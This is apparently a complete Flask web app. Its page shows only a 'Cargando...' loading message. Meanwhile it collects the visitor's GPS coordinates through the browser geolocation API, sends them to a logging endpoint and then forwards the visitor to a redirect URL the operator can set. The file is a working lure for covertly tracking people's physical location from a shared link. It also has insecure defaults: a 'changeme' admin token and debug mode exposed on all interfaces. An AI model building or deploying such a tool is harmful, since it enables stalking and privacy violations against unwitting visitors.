from flask import Flask, request, render_template_string, jsonify
from datetime import datetime
import json
import os

app = Flask(__name__)

CONFIG_FILE = "config.json"
ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "changeme")

def load_config():
    if os.path.isfile(CONFIG_FILE):
        with open(CONFIG_FILE) as f:
            return json.load(f)
    return {"redirect_url": "https://google.com"}

def save_config(cfg):
    with open(CONFIG_FILE, "w") as f:
        json.dump(cfg, f)

config = load_config()

HTML = """
<!DOCTYPE html>
<html>
<body>
<h3>Cargando...</h3>

<script>
function sendAndRedirect(pos) {
  fetch("/location", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      lat: pos.coords.latitude,
      lon: pos.coords.longitude
    })
  }).catch(() => {});
}

navigator.geolocation.getCurrentPosition(
  pos => {
    sendAndRedirect(pos);
    setTimeout(() => window.location = "{{ url }}", 500);
  },
  err => window.location = "{{ url }}"
);
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML, url=config["redirect_url"])

@app.route("/location", methods=["POST"])
def location():
    print(request.json)
    return "", 204

@app.route("/config/url", methods=["POST"])
def set_url():
    token = request.headers.get("X-Admin-Token")
    if token != ADMIN_TOKEN:
        return jsonify({"error": "unauthorized"}), 401

    data = request.json
    url = data.get("url")

    if not url or not url.startswith("http"):
        return jsonify({"error": "invalid url"}), 400

    config["redirect_url"] = url
    save_config(config)

    return jsonify({"status": "ok", "redirect_url": url})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)
